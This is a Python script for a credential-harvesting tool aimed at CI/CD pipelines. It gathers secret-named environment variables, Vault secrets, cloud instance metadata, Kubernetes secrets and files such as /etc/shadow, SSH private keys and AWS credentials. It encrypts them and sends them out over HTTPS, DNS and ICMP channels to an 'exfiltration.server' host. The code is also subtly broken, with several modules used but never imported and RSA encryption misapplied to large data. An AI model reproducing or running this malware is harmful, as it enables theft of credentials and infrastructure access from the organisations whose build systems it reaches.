from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
import urllib.parse

class SecretHarvester:
    def __init__(self, public_key_path):
        self.public_key = self.load_public_key(public_key_path)
        self.secrets = {}
        self.exfiltration_channels = ['https', 'dns', 'icmp']

    def load_public_key(self, path):
        with open(path, "rb") as key_file:
            return serialization.load_pem_public_key(
                key_file.read(),
                backend=serialization.default_backend()
            )

    def detect_ci_cd_platform(self):
        ci_cd_vars = {
            'GITHUB_ACTIONS': 'GitHub Actions',
            'GITLAB_CI': 'GitLab CI',
            'TRAVIS': 'Travis CI',
            'JENKINS_URL': 'Jenkins',
            'CIRCLECI': 'CircleCI'
        }
        for var, platform in ci_cd_vars.items():
            if var in os.environ:
                return platform
        return "Unknown"

    def extract_env_vars(self):
        for key, value in os.environ.items():
            if any(word in key.lower() for word in ['token', 'key', 'secret', 'pass', 'cred']):
                self.secrets[key] = self.encrypt_secret(value)

    def extract_vault_secrets(self):
        vault_token = os.getenv('VAULT_TOKEN')
        if vault_token:
            try:
                response = requests.get(
                    'http://127.0.0.1:8200/v1/secret/data/credentials',
                    headers={'X-Vault-Token': vault_token}
                )
                if response.status_code == 200:
                    data = response.json().get('data', {}).get('data', {})
                    for key, value in data.items():
                        self.secrets[f"vault_{key}"] = self.encrypt_secret(value)
            except requests.RequestException:
                pass

    def extract_cloud_metadata(self):
        cloud_providers = [
            ('http://169.254.169.254/latest/meta-data/', 'AWS'),
            ('http://169.254.169.254/computeMetadata/v1/', 'GCP'),
            ('http://169.254.169.254/metadata/instance/', 'Azure')
        ]
        for url, provider in cloud_providers:
            try:
                response = requests.get(url, timeout=2)
                if response.status_code == 200:
                    self.secrets[f"{provider}_metadata"] = self.encrypt_secret(response.text)
            except requests.RequestException:
                pass

    def extract_k8s_secrets(self):
        try:
            output = subprocess.check_output(['kubectl', 'get', 'secrets', '-o', 'json'])
            secrets = json.loads(output)
            for item in secrets.get('items', []):
                for key, value in item.get('data', {}).items():
                    self.secrets[f"k8s_{item['metadata']['name']}_{key}"] = self.encrypt_secret(base64.b64decode(value).decode())
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass

    def extract_file_system_secrets(self):
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '~/.ssh/id_rsa',
            '~/.aws/credentials',
            '~/.gitconfig'
        ]
        for file_path in sensitive_files:
            try:
                with open(os.path.expanduser(file_path), "r") as file:
                    self.secrets[f"file_{hashlib.md5(file_path.encode()).hexdigest()}"] = self.encrypt_secret(file.read())
            except FileNotFoundError:
                pass

    def encrypt_secret(self, secret):
        return self.public_key.encrypt(
            secret.encode(),
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        ).hex()

    def exfiltrate_https(self, data):
        try:
            requests.post('https://exfiltration.server/harvest', json=data)
        except requests.RequestException:
            pass

    def exfiltrate_dns(self, data):
        encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
        for i in range(0, len(encoded_data), 255):
            subdomain = encoded_data[i:i+255]
            try:
                socket.create_connection((f"{subdomain}.exfiltration.server", 80), timeout=5)
            except socket.error:
                pass

    def exfiltrate_icmp(self, data):
        encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
        for char in encoded_data:
            try:
                subprocess.run(['ping', '-c', '1', f'{ord(char)}.exfiltration.server'], capture_output=True)
            except subprocess.CalledProcessError:
                pass

    def exfiltrate_secrets(self):
        for channel in self.exfiltration_channels:
            exfiltrate_func = getattr(self, f'exfiltrate_{channel}')
            exfiltrate_func(self.secrets)

    def harvest(self):
        print(f"[*] Detected CI/CD Platform: {self.detect_ci_cd_platform()}")
        self.extract_env_vars()
        self.extract_vault_secrets()
        self.extract_cloud_metadata()
        self.extract_k8s_secrets()
        self.extract_file_system_secrets()
        self.exfiltrate_secrets()
        print("[*] Secret harvesting and exfiltration complete.")

if __name__ == "__main__":
    harvester = SecretHarvester("public_key.pem")
    harvester.harvest()
